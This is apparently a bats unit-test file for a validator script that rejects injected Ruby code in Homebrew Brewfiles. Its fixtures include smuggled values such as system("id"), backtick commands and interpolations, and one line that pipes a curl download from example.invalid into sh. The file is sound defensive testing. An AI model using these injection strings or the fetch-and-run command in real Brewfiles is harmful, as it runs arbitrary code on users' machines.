#!/usr/bin/env bats
# Unit tests for build/validate-brewfiles.sh.
# A mock `brew` is placed first in PATH so the tests never touch real Homebrew
# metadata and can assert exactly which brew invocations the validator makes.
# Run with: bats tests/unit/validate-brewfiles_test.bats

VALIDATOR="${BATS_TEST_DIRNAME}/../../build/validate-brewfiles.sh"

setup() {
    TEST_ROOT="${BATS_TEST_TMPDIR}"
    BREW_DIR="${TEST_ROOT}/brew"
    STUB_BIN="${TEST_ROOT}/bin"
    BREW_LOG="${TEST_ROOT}/brew.log"

    mkdir -p "${BREW_DIR}" "${STUB_BIN}"
    : > "${BREW_LOG}"

    export PATH="${STUB_BIN}:${PATH}"
    export BREW_LOG

    cat > "${STUB_BIN}/brew" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${BREW_LOG}"
if [[ "${1:-}" == "info" && "${4:-}" == "missing" ]]; then
    exit 1
fi
exit 0
EOF
    chmod +x "${STUB_BIN}/brew"
}

run_validator() {
    run bash "${VALIDATOR}" "${1:-${BREW_DIR}}"
}

@test "validate-brewfiles: accepts literal brew formulae" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
brew "rtk"
brew "topgrade"
EOF

    run_validator
    [ "${status}" -eq 0 ]
    grep -q -- "info --formula -- rtk" "${BREW_LOG}"
    grep -q -- "info --formula -- topgrade" "${BREW_LOG}"
}

@test "validate-brewfiles: accepts literal cask declarations" {
    printf 'cask "visual-studio-code"\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -eq 0 ]
    grep -q -- "info --cask -- visual-studio-code" "${BREW_LOG}"
}

@test "validate-brewfiles: rejects Ruby interpolation without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
brew "#{ENV.fetch("BAD")}"
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: rejects double-quoted brew interpolation without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
brew "#$var"
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
    [[ "${output}" == *"expected a quoted literal brew/cask name"* ]]
}

@test "validate-brewfiles: rejects brace interpolation inside single-quoted cask name without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
cask '#{bad}'
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
    [[ "${output}" == *"expected a quoted literal brew/cask name"* ]]
}

@test "validate-brewfiles: rejects Ruby arguments after brew name without invoking brew" {
    printf 'brew "rtk", system("id")\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
    [[ "${output}" == *"expected a quoted literal brew/cask name"* ]]
}

@test "validate-brewfiles: rejects Ruby arguments after cask name without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
cask "visual-studio-code", args: [`id`]
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: rejects arbitrary Ruby statements without invoking brew" {
    printf 'system("curl https://example.invalid | sh")\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: keeps accepting comments and blank lines" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
# a comment

brew "rtk"

  # indented comment
EOF

    run_validator
    [ "${status}" -eq 0 ]
    grep -q -- "info --formula -- rtk" "${BREW_LOG}"
}

@test "validate-brewfiles: fails when brew metadata lookup fails" {
    printf 'brew "missing"\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -ne 0 ]
    [[ "${output}" == *"FAIL"* ]]
}

@test "validate-brewfiles: rejects computed tap declarations without invoking brew" {
    printf 'tap "homebrew/#{BAD}"\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: rejects double-quoted tap interpolation without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
tap "homebrew/#$bar"
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: rejects hash inside single-quoted tap name without invoking brew" {
    cat > "${BREW_DIR}/default.Brewfile" <<'EOF'
tap 'homebrew/#@bar'
EOF

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: syncs literal taps before package checks" {
    printf 'tap "homebrew/cask"\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -eq 0 ]
    grep -q -- "bundle --file=" "${BREW_LOG}"
}

@test "validate-brewfiles: rejects unquoted declarations without invoking brew" {
    printf 'brew bat\n' > "${BREW_DIR}/default.Brewfile"

    run_validator
    [ "${status}" -ne 0 ]
    [ ! -s "${BREW_LOG}" ]
}

@test "validate-brewfiles: fails when the root directory is absent" {
    run_validator "${TEST_ROOT}/does-not-exist"
    [ "${status}" -ne 0 ]
}

@test "validate-brewfiles: fails when no Brewfiles are present" {
    run_validator
    [ "${status}" -ne 0 ]
    [[ "${output}" == *"No Brewfiles found"* ]]
}

@test "validate-brewfiles: discovers Brewfiles in subdirectories" {
    mkdir -p "${BREW_DIR}/nested"
    printf 'brew "rtk"\n' > "${BREW_DIR}/nested/tools.Brewfile"

    run_validator
    [ "${status}" -eq 0 ]
    grep -q -- "info --formula -- rtk" "${BREW_LOG}"
}
